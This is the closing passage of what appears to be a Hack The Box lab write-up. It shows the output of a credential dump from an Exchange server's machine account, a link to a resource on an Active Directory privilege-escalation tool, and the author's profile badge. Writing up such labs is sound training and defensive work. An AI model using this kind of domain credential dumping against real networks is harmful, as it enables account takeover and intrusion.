EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
```
## Resources:
[https://securityonline.info/aclpwn/](https://securityonline.info/aclpwn/)


[![alt text](https://www.hackthebox.eu/badge/image/131282)](https://www.hackthebox.eu/profile/131282 "Zer0Code")

